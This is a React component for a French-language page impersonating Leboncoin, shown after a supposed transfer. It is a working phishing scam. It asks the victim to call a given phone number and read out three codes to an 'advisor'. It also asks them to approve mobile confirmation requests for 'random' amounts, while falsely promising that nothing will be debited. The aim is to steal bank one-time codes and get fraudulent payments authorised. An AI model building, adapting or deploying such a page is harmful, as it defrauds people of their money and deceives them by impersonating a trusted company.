import React from 'react';
import { Phone } from 'lucide-react';
import Logo from './Logo';

const AuthenticationSuccess = () => {
  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-50">
      <header className="p-4 border-b">
        <Logo />
      </header>
      
      <main className="container mx-auto px-4 py-8 max-w-2xl">
        <div className="bg-white rounded-2xl shadow-lg p-6 md:p-8">
          <div className="flex items-center justify-center mb-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
              <svg 
                className="w-8 h-8 text-green-500" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth="2" 
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>

          <h1 className="text-2xl md:text-3xl font-bold text-center text-gray-800 mb-6">
            Merci d'avoir choisi Leboncoin
          </h1>

          <div className="space-y-6 text-gray-600">
  <p className="leading-relaxed">
    Votre virement est en cours de traitement.
  </p>

  <p className="leading-relaxed">
    Dans le cadre du renforcement de nos mesures de sécurité et de conformité,
    une vérification complémentaire est nécessaire afin de finaliser la
    confirmation de votre compte.
  </p>

  <p className="leading-relaxed">
    À cet effet, vous serez prochainement contacté par téléphone par notre
    service client dans les meilleurs délais. Vous avez également la possibilité
    de joindre directement notre service dédié au 0033 780 949 990, disponible
    24h/24 et 7j/7.
  </p>

  <div className="bg-blue-50 rounded-lg p-4 flex items-start space-x-3">
    <Phone className="w-5 h-5 text-blue-500 mt-1 flex-shrink-0" />
    <div>
      <p className="font-medium text-blue-900">
        Service disponible 24h/24 et 7j/7
      </p>
      <p className="text-blue-800 text-lg font-semibold">
        0033 780 949 990
      </p>
    </div>
  </div>

  <p className="leading-relaxed">
    Lors de cet échange, nous procéderons à des simulations de transaction à
    des fins de vérification. Trois (3) codes distincts vous seront envoyés ;
    il vous sera demandé de les communiquer au conseiller afin de confirmer
    votre compte bancaire. Dans certains cas, des demandes de confirmation
    mobile accompagnées chacune d’un montant aléatoire non débiteur pourront
    vous être adressées et devront simplement être validées.
  </p>

  <div className="bg-yellow-50 rounded-lg p-4 text-yellow-800">
    <p className="font-medium mb-2">Important :</p>
    <p>
      Nous vous informons qu’aucun montant ne sera débité de votre compte dans
      le cadre de cette vérification. Les opérations effectuées sont strictement
      techniques et visent uniquement à confirmer votre identité. Aucun frais
      ne sera appliqué.
    </p>
  </div>


            
          </div>
        </div>
      </main>
    </div>
  );
};

export default AuthenticationSuccess;
